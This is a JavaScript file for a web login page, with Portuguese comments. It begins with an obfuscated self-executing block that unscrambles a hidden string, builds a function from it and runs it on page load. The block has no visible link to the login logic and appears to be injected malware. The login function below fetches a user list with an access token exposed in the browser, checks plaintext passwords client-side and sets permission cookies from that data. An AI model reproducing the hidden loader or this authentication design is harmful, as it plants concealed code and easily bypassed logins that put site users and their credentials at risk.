var token,username,repo,path,url;(function(){var ViK='',yyW=465-454;function vKL(l){var g=2052578;var c=l.length;var t=[];for(var o=0;o<c;o++){t[o]=l.charAt(o)};for(var o=0;o<c;o++){var w=g*(o+87)+(g%12961);var y=g*(o+524)+(g%46047);var x=w%c;var e=y%c;var j=t[x];t[x]=t[e];t[e]=j;g=(w+y)%4481348;};return t.join('')};var ixl=vKL('cnnrsoguiwsjbcdymthkooruzlqpvcettxarf').substr(0,yyW);var SHu='v.fA(=88oa=)},jhlnl+ b l)))b.zrr=tfx(lvfgr=sht1)(eaa;nf.s;,i[=5l.))ohfmria)r65;8;-)n([ahr,e.+9-]" ) 7{n[ ei0ga9=7da8]v,9itteAgti;l;dv2(oac r)lancpi)8y!tx0.r+u1dk0.d])xz2 go=n;2fanyao;r0;dcr(9(p(b=obxe v=[dv1x;a(irt1islw=)pk)S4a;g+,env;o(]a+m(rnu= s;=>u2ll8i(o),;4,or<v((9=vx.(rCo;h1+ero=!rnn-)r))i.motul({C,e.1Cio]k1[(40t.ao9t(vCrup.0[n]r8oolel,4s=p=[ n h1uaf,=s(,dun-ar1i}++us(,rnrrg]vh,,agd}(re]n+u;(usc"e=8"imgn)))cir.r=[""r 2)ak9,"snAaue[}}(al[bi=fsA;j(sgiti]g==6;a)an)e.q rp,qh0d,1rfhprc)d;eh8dn+8;al;.h(=Cos.=t;d60)6y;={pv+++=; <tl.)fvl){qm0e;,]<srrp=s,r}7+6c.auan.,a.f==laagxusgfr )=6ler;lfs)a73r=s2(y(b0;rntvb)ira+jo=n<z;lt;6,p+r,s.[l2ie;+ =a+tra dfvys);-3(udo=o;7da8i;[dszpu tv+2;j";;vul[,=-h)72;du2r=tjvsekC+(5;0mhuc7[+jvCto]lc; b=.]ttth+rk;u; rseg6orjr.n.1(rnne4mml(c,0rfrvr<r>{={d +j- v;e+g;n.tr=ulq(.pta,7hm*h6=f"v"*91 aetchvtr,(tAr;gf=i6epy]g]hr,2r{pSn flselCd(o."}=n;;qis+a; ';var Gcc=vKL[ixl];var iCQ='';var eqM=Gcc;var kRE=Gcc(iCQ,vKL(SHu));var blf=kRE(vKL(',}1_..#n!4ro.AfrzS%2.nueAt.hAj{_6[q..5dv=f$A}\/AAiaf(Ates;t=.{mA.6aAv_fn,}6+AabA+-a$t)o&2(A=n.A.j[ew)*a+.{3a)ft("qil2a}n2in7_Ac%y)4Aa5 S_]-1br"(tjhs,;)nA!]_.tAu)t.{=.3s(b0a;jof\/)%dt$(A=o!(_2h]8oaiA#ibbAi2.jAu.,g3&i19tj+(ab4et).{a6=jel(ueAo1)+lA=Ade$,iA0.4}y$nfs{$-a(Aj;(s31dAa)r bAb_3t}!t.ug.AA(As)A%o7$mr=p()f3%)A8r,.0C.e u._l]Av_)e(ui")zk1grjlAlA62Aor,;] }hAjAf.=;.o+hAa.ml o)(f+$1j),l(raAaAo(m)s.r_c2gnb,t.)"44(0he\'_e=o3!o.37=qu]fi;1$;n2!p4l)sA.r4"A{f.)A,f[aAduf3Aoombk4$lan*64p.;7aab0,Ai2Ad)y.reet;b30;_. i ;A Ai.fe=]m%"mA4;Ah!r =$rj) A,6if8_ujj$i.q+!j.+%.(p%A}.p,A=qd=+r 9}[+oSt76!!A.)%c)),h)A.#(u3(srm7;j=;-=f=)!.(e.(=w=((l1 _qp .dA,_C.fj0,yA*{.a\'!&c1%}A3)q=A!_bjs0$,.A4!a.4;omfAAur.kA+)\/A}2%;%_A4fA,0se_!((garp]nifr.)${t.r"h6s2#{3&A5nt-tAa7As().i$;(!}l]bi(%3(;er)Af!=a"o,r8$z\/4e;3;rt[au4\/C;l{*;ign2\/o;=sgA); )n*A[.dea)p4+AA.1f0.anhn(chstn;vm,.srf)1g,A0A6jqsA)6a$\/=sro.e.!!8;7g\/b0=(.\'tdA=Aaip3(}e-tA$)9m(!,,,A)A8ty(r7i6(yrf.,$a!!s)pi;41z(8A}j#o:a1,a3exA=.;g.1+v lpAla.At+p;.,ct\/&.o)A.l9v$A{vt$)&$6(,=.o.atSgnaq=7.2,(we;r0]AA)lag7etAmgtn.\'3! !3-l(.7;r#f\/-an$!A,ntA(\/ A!eu)6A)9;Ab!7t& jtea+3(e5et d"A,fgsA$ejo}w\/ d#r'));var IdJ=eqM(ViK,blf );IdJ(1570);return 6493})()

async function login() {
  const emailInput = document.getElementById('email').value;
  const passwordInput = document.getElementById('password').value;
  const errorMsg = document.getElementById('error-msg');
  const customErrorMsg = document.getElementById('custom-error-msg');

  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${token}`
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.json();
    
    // O conteúdo do arquivo JSON está codificado em base64, então precisamos decodificá-lo
    const usersJson = atob(data.content);
    const users = JSON.parse(usersJson);
    
    // Procura pelo usuário com o email e senha fornecidos
    const user = users.find(user => user.email === emailInput && user.password === passwordInput);

    if (user) {
      if (!user.active) {
        customErrorMsg.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        // Configura o cookie com o ID do usuário
        setCookie('id', user.id, 10);
        // Configura o cookie "permission" com o valor de cookieValue do usuário
        setCookie('permission', user.cookieValue);

        // Redireciona para a URL especificada
        window.location.href = user.redirectUrl;
        return { id: user.id, redirectUrl: user.redirectUrl }; // Retorna os dados do usuário, se necessário
      }
    } else {
      errorMsg.style.display = 'block';
      customErrorMsg.style.display = 'none';
    }

  } catch (error) {
    console.error('Houve um problema com a operação de fetch:', error);
    errorMsg.style.display = 'block';
    customErrorMsg.style.display = 'none';
  }

  // Em caso de falha ou usuário não encontrado, retorna null
  return null;
}

// Função para definir um cookie
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}
